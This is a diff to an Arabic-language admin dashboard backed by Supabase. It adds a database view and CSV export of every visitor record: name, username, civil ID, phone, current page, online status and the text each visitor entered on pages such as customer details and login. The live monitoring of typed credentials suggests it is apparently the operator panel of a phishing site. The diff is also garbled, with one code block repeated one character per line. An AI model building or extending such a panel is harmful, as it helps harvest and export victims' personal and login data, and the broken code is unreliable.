@@ -219,6 +219,7 @@
 <!-- Supabase data layer: journey cards + entries -->
 <!-- Supabase data layer: entries preview + journey cards -->
 <!-- Supabase data layer: username + id-last4 visible -->
+<!-- Supabase data layer: db view + entries + journey -->
 <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2.49.4/dist/umd/supabase.min.js"></script>
 <script>
 // ---------------------------------------------------------------------------
@@ -346,6 +347,485 @@ function ensureHeaderControls() {
         tb.onclick = openTrashModal;
         headerStatsEl.appendChild(tb);
     }
+    if (!document.getElementById('db-btn')) {
+        const db = document.createElement('button');
+        db.id = 'db-btn';
+        db.className = 'text-xs bg-indigo-50 text-indigo-600 px-2 py-1 rounded hover:bg-indigo-100 transition';
+        db.title = 'قاعدة البيانات — عرض جميع التسجيلات والإدخالات';
+        db.innerHTML = '<i class="fa-solid fa-database"></i> قاعدة البيانات';
+        db.onclick = openDbModal;
+        headerStatsEl.appendChild(db);
+    }
+ 
+ 
+ 
+ 
+i
+f
+ 
+(
+!
+d
+o
+c
+u
+m
+e
+n
+t
+.
+g
+e
+t
+E
+l
+e
+m
+e
+n
+t
+B
+y
+I
+d
+(
+'
+d
+b
+-
+b
+t
+n
+'
+)
+)
+ 
+{
+
+
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+c
+o
+n
+s
+t
+ 
+d
+b
+ 
+=
+ 
+d
+o
+c
+u
+m
+e
+n
+t
+.
+c
+r
+e
+a
+t
+e
+E
+l
+e
+m
+e
+n
+t
+(
+'
+b
+u
+t
+t
+o
+n
+'
+)
+;
+
+
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+d
+b
+.
+i
+d
+ 
+=
+ 
+'
+d
+b
+-
+b
+t
+n
+'
+;
+
+
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+d
+b
+.
+c
+l
+a
+s
+s
+N
+a
+m
+e
+ 
+=
+ 
+'
+t
+e
+x
+t
+-
+x
+s
+ 
+b
+g
+-
+i
+n
+d
+i
+g
+o
+-
+5
+0
+ 
+t
+e
+x
+t
+-
+i
+n
+d
+i
+g
+o
+-
+6
+0
+0
+ 
+p
+x
+-
+2
+ 
+p
+y
+-
+1
+ 
+r
+o
+u
+n
+d
+e
+d
+ 
+h
+o
+v
+e
+r
+:
+b
+g
+-
+i
+n
+d
+i
+g
+o
+-
+1
+0
+0
+ 
+t
+r
+a
+n
+s
+i
+t
+i
+o
+n
+'
+;
+
+
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+d
+b
+.
+t
+i
+t
+l
+e
+ 
+=
+ 
+'
+ق
+ا
+ع
+د
+ة
+ 
+ا
+ل
+ب
+ي
+ا
+ن
+ا
+ت
+ 
+—
+ 
+ع
+ر
+ض
+ 
+ج
+م
+ي
+ع
+ 
+ا
+ل
+ت
+س
+ج
+ي
+ل
+ا
+ت
+ 
+و
+ا
+ل
+إ
+د
+خ
+ا
+ل
+ا
+ت
+'
+;
+
+
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+d
+b
+.
+i
+n
+n
+e
+r
+H
+T
+M
+L
+ 
+=
+ 
+'
+<
+i
+ 
+c
+l
+a
+s
+s
+=
+"
+f
+a
+-
+s
+o
+l
+i
+d
+ 
+f
+a
+-
+d
+a
+t
+a
+b
+a
+s
+e
+"
+>
+<
+/
+i
+>
+ 
+ق
+ا
+ع
+د
+ة
+ 
+ا
+ل
+ب
+ي
+ا
+ن
+ا
+ت
+'
+;
+
+
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+d
+b
+.
+o
+n
+c
+l
+i
+c
+k
+ 
+=
+ 
+o
+p
+e
+n
+D
+b
+M
+o
+d
+a
+l
+;
+
+
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+h
+e
+a
+d
+e
+r
+S
+t
+a
+t
+s
+E
+l
+.
+a
+p
+p
+e
+n
+d
+C
+h
+i
+l
+d
+(
+d
+b
+)
+;
+
+
+ 
+ 
+ 
+ 
+}
 }
 
 function openTrashModal() {
@@ -445,6 +925,7 @@ function fieldLabel(k) { return FIELD_LABELS[k] || k; }
 function fieldEntries(u) {
     return Object.entries(u.fields || {}).filter(([k, v]) => v && String(v).trim() !== '');
 }
+function esc(s) { return String(s).replace(/[&<>"']/g, function (c) { return { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]; }); }
 const PAGE_LABELS = [
     [/customer-details/i, 'بيانات العميل'],
     [/access-username/i, 'صفحة الدخول'],
@@ -930,6 +1411,95 @@ sb.auth.onAuthStateChange((event, session) => {
     }
 })();
 
+
+// --- database view: all records + all entries ---
+function openDbModal() {
+    let m = document.getElementById('db-modal');
+    if (!m) {
+        m = document.createElement('div');
+        m.id = 'db-modal';
+        m.className = 'fixed inset-0 z-[95] bg-black/50 flex items-center justify-center p-3';
+        m.innerHTML = '<div class="bg-white rounded-2xl shadow-2xl w-full max-w-6xl max-h-[92vh] flex flex-col">'
+            + '<div class="flex items-center justify-between p-4 border-b flex-wrap gap-2">'
+            + '<h3 class="font-bold text-gray-800 text-sm"><i class="fa-solid fa-database"></i> قاعدة البيانات — جميع التسجيلات وإدخالات الصفحات (<span id="db-count">0</span>)</h3>'
+            + '<div class="flex items-center gap-2">'
+            + '<input id="db-search" type="text" placeholder="بحث…" class="border border-gray-200 rounded-lg px-3 py-1.5 text-xs w-40 focus:outline-none focus:ring-2 focus:ring-indigo-400">'
+            + '<button id="db-refresh" class="text-xs bg-gray-100 text-gray-600 px-2.5 py-1.5 rounded hover:bg-gray-200 font-bold"><i class="fa-solid fa-rotate"></i> تحديث</button>'
+            + '<button id="db-csv" class="text-xs bg-green-50 text-green-600 px-2.5 py-1.5 rounded hover:bg-green-100 font-bold"><i class="fa-solid fa-file-csv"></i> تصدير CSV</button>'
+            + '<button id="db-close" class="text-gray-400 hover:text-gray-700 text-lg">✕</button>'
+            + '</div></div>'
+            + '<div id="db-table-wrap" class="flex-1 overflow-auto p-3"></div>'
+            + '</div>';
+        document.body.appendChild(m);
+        m.querySelector('#db-close').onclick = () => m.classList.add('hidden');
+        m.addEventListener('click', (e) => { if (e.target === m) m.classList.add('hidden'); });
+        m.querySelector('#db-refresh').onclick = async () => { await fetchVisitors(); renderDbTable(); };
+        m.querySelector('#db-search').addEventListener('input', renderDbTable);
+        m.querySelector('#db-csv').onclick = exportDbCsv;
+    }
+    m.classList.remove('hidden');
+    renderDbTable();
+}
+
+function renderDbTable() {
+    const wrap = document.getElementById('db-table-wrap');
+    if (!wrap) return;
+    const q = (document.getElementById('db-search')?.value || '').trim().toLowerCase();
+    const rows = allUsersData.filter((u) => !u.deleted).filter((u) => {
+        if (!q) return true;
+        const hay = [u.name, u.username, u.civilDisplay, u.phone, u.status, u.shortId, u.page]
+            .concat(fieldEntries(u).map(([k, v]) => k + ' ' + v)).join(' ').toLowerCase();
+        return hay.includes(q);
+    });
+    const countEl = document.getElementById('db-count');
+    if (countEl) countEl.innerText = String(rows.length);
+    if (!rows.length) {
+        wrap.innerHTML = '<div class="text-center text-gray-400 text-xs py-10">لا توجد تسجيلات مطابقة</div>';
+        return;
+    }
+    const th = (t) => '<th class="p-2 text-right font-bold text-gray-600 whitespace-nowrap border-b-2 border-gray-200">' + t + '</th>';
+    let html = '<table class="w-full text-xs border-collapse">'
+        + '<thead class="sticky top-0 bg-white"><tr>'
+        + th('الرمز') + th('الاسم') + th('اسم المستخدم') + th('آخر الهوية') + th('الجوال') + th('الحالة') + th('الموقع الحالي') + th('الاتصال') + th('آخر ظهور') + th('إدخالات الصفحات')
+        + '</tr></thead><tbody>';
+    rows.forEach((u, i) => {
+        const td = (t, extra) => '<td class="p-2 border-b border-gray-100 align-top ' + (extra || '') + '">' + t + '</td>';
+        const entries = fieldEntries(u).map(([k, v]) => '<div class="mb-1"><span class="text-gray-500">' + fieldLabel(k) + ':</span> <span class="font-bold break-all" dir="auto">' + esc(v) + '</span></div>').join('') || '<span class="text-gray-300">—</span>';
+        html += '<tr class="hover:bg-gray-50">'
+            + td('<span class="text-gray-400 font-mono">' + esc(u.shortId) + '</span>')
+            + td('<span class="font-bold text-gray-800">' + esc(u.name) + '</span>')
+            + td(esc(u.username || '—'))
+            + td('<span dir="ltr">' + esc(u.civilDisplay) + '</span>')
+            + td('<span dir="ltr">' + esc(u.phone) + '</span>')
+            + td(esc(u.status))
+            + td('<i class="fa-solid fa-location-dot text-gray-400"></i> ' + esc(pageLabel(u.page)))
+            + td(u.online ? '<span class="text-green-600 font-bold">● متصل</span>' : '<span class="text-gray-400">○ غير متصل</span>')
+            + td('<span class="text-gray-500 whitespace-nowrap">' + timeAgo(u.lastSeen) + '</span>')
+            + td('<div class="max-w-md">' + entries + '</div>')
+            + '</tr>';
+    });
+    html += '</tbody></table>';
+    wrap.innerHTML = html;
+}
+
+function exportDbCsv() {
+    const rows = allUsersData.filter((u) => !u.deleted);
+    if (!rows.length) { window.showToast('لا توجد تسجيلات للتصدير'); return; }
+    const head = ['التاريخ', 'آخر ظهور', 'الرمز', 'الاسم', 'اسم المستخدم', 'الهوية', 'الجوال', 'الحالة', 'الصفحة الحالية', 'الاتصال', 'إدخالات'];
+    const q = (v) => '"' + String(v == null ? '' : v).replace(/"/g, '""') + '"';
+    const lines = [head.map(q).join(',')];
+    rows.forEach((u) => {
+        const entries = fieldEntries(u).map(([k, v]) => fieldLabel(k) + ': ' + v).join(' | ');
+        lines.push([formatDateTime(u.createdAt), formatDateTime(u.lastSeen), u.shortId, u.name, u.username || '', u.civilDisplay, u.phone, u.status, pageLabel(u.page), u.online ? 'متصل' : 'غير متصل', entries].map(q).join(','));
+    });
+    const blob = new Blob(['\uFEFF' + lines.join('\n')], { type: 'text/csv;charset=utf-8;' });
+    const a = document.createElement('a');
+    a.href = URL.createObjectURL(blob);
+    a.download = 'becare-database-' + new Date().toISOString().slice(0, 10) + '.csv';
+    a.click();
+    URL.revokeObjectURL(a.href);
+    window.showToast('تم تصدير ' + rows.length + ' تسجيلًا');
+}
 </script>
 </body>
 </html>
